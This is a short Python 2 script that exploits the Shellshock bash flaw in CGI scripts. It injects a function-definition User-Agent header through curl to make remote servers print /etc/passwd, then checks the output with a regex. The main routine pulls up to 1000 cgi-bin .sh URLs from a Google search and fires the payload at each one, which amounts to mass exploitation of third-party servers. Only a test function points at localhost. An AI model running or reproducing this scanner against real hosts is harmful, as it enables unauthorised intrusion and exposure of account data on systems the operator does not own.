from google import search
from shell import shell
import re

def validate(url):
# curl -A "() { foo;};echo;/bin/cat /etc/passwd"
  cmd = 'curl --connect-timeout 30 --max-time 60 -A "() { foo;};echo;/bin/cat /etc/passwd" %s' % (url)
#  print cmd
  sh = shell(cmd)
  cont = sh.output(raw=True)
  #print cont
  p = re.compile(r'.*?:.*?:\d*?:\d*?:.*?:.*?:.*')
  '''
  match only report from start 0, please use search
  '''
  m = p.search(cont)
  if m:
    return True
  return False


def test():
  url = 'http://127.0.0.1/cgi-bin/test.sh'
  if(validate(url)):
    print "!!!", url
  else:
    print "---", url

def main():
  for id, url in enumerate(search("filetype:sh inurl:cgi-bin", stop=1000)):
    if(validate(url)):
      print id, "!!!", url
    else:
      print id, "---", url

if __name__ == '__main__':
  main()
